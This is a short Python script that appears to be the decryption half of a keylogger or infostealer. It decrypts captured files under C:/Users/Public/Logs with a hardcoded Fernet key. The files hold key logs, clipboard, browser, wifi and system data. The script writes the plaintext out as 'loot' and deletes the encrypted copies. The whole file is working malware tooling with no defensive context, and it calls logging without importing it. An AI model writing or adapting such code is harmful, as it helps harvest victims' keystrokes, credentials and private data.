import sys, os, re
from cryptography.fernet import Fernet

if __name__ == '__main__':
    try:    
        file_path = 'C:\\Users\\Public\\Logs\\'
        encrypted_files = [ 'e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt', 
                            'e_browser.txt', 'e_key_logs.txt' ]

        regex = re.compile(r'.+\.xml$')
        path = 'C:/Users/Public/Logs'
        re_list = []
        for dirpath, dirnames, filenames in os.walk(path):
            [ re_list.append(file) for file in filenames if regex.match(file) ]

        encrypted_list = encrypted_files + re_list

        key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

        for file_decrypt in encrypted_list:
            x = open(file_path + file_decrypt, 'rb')
            data = x.read()
            decrypted = Fernet(key).decrypt(data)
            loot = open(file_path + file_decrypt[2:], 'ab')
            loot.write(decrypted)
            x.close()
            loot.close()
            os.remove(file_path + file_decrypt)

    except KeyboardInterrupt:
        print('* Ctrl + C detected...program exiting *')

    except Exception as ex:
        logging.exception('* Error Occured: {}*'.format(ex))